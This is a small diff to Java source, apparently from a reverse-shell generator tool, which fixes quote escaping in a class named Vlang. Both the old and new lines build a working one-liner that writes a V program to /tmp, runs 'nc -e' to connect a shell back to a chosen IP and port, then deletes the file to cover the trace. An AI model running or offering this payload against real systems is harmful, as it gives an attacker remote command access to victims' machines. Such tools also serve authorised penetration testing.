@@ -8,7 +8,7 @@
 
         public Vlang(String localIP, int localPort, LISTENER listener, SHELLS shellType){
             super(localIP, localPort, listener, shellType);
-            shellFormat = String.format("echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\\\"nc -e %s %s %s 0>&1\\\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v",this.getShell(), this.getLocalIP() ,this.getLocalPort());
+            shellFormat = String.format("echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e %s %s %s 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v",this.getShell(), this.getLocalIP() ,this.getLocalPort());
         }
 
         @Override
